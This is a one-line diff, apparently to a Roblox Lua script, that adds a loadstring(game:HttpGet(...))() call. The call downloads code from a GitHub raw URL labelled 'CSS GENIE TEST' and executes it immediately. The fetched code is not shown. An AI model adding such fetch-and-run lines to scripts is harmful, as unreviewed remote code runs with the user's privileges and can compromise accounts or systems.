@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kirill31312/CSS-GENIE/refs/heads/main/CSS%20GENIE%20TEST", true))()
